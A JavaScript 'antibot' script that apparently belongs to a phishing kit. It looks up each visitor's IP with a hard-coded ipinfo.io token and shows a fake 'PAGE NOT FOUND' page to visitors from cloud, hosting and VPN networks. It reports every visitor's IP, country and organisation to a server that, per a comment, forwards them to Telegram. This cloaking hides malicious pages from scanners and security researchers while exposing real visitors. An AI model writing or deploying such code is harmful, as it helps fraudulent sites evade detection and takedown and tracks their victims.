// antibot.js

// Function to get location data
async function getUserLocation() {
    try {
        const response = await fetch("https://ipinfo.io/json?token=6646828ead20c6");
        return await response.json();
    } catch (error) {
        console.error("Could not fetch location details:", error);
        return { country: "Unknown", org: "Unknown" };
    }
}

// Function to check if IP is from VPN/proxy/hosting provider
async function checkForNonResidentialIP() {
    try {
        const response = await fetch("https://ipinfo.io/json?token=6646828ead20c6");
        const data = await response.json();

        const hostingProviders = [
            'digitalocean','aws','amazon','google','microsoft','azure','linode','vultr',
            'ovh','scaleway','hetzner','rackspace','hostgator','godaddy','namecheap',
            'cloudflare','akamai','fastly','softlayer','ibm','oracle','alibaba','tencent',
            'hosting','host','datacenter','data center','dedicated','server','vps','virtual',
            'llc','inc','ltd'
        ];

        const org = (data.org || '').toLowerCase();
        const isHostingProvider = hostingProviders.some(provider => org.includes(provider));

        const asnMatch = data.org ? data.org.match(/AS(\d+)/) : null;
        const asn = asnMatch ? asnMatch[1] : null;
        const hostingASNs = ['14061', '16509', '8075', '15169', '20940', '13335'];
        const isHostingASN = asn && hostingASNs.includes(asn);

        return isHostingProvider || isHostingASN;
    } catch (error) {
        console.error("Error checking for non-residential IP:", error);
        return false;
    }
}

// Function to send messages to server (server.js will push to Telegram)
async function notifyServer(status, reason, locationData) {
    try {
        await fetch(`/__antibot-report`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                status,
                reason,
                ip: locationData.ip || "Unknown",
                country: locationData.country || "Unknown",
                org: locationData.org || "Unknown"
            })
        });
    } catch (err) {
        console.error("Error reporting to server:", err);
    }
}

// Function to show the "PAGE NOT FOUND" screen
function showPageNotFound() {
    document.body.innerHTML = `
        <div style="background-color: white; width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center;">
            <h1 style="font-weight: bold; color: black; font-size: 36px;">PAGE NOT FOUND</h1>
        </div>
    `;
    document.body.style.backgroundColor = "white";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
}

// Combined check on page load
window.onload = async function() {
    try {
        const locationData = await getUserLocation();
        const isDataCenter = await checkForNonResidentialIP();

        if (isDataCenter) {
            showPageNotFound();
            await notifyServer("BLOCKED", "Data center/VPN detected", locationData);
        } else {
            await notifyServer("ALLOWED", "Residential/legit visitor", locationData);
            // ✅ legit user -> allow normal page load
        }
    } catch (error) {
        console.error("Error in antibot check:", error);
    }
};
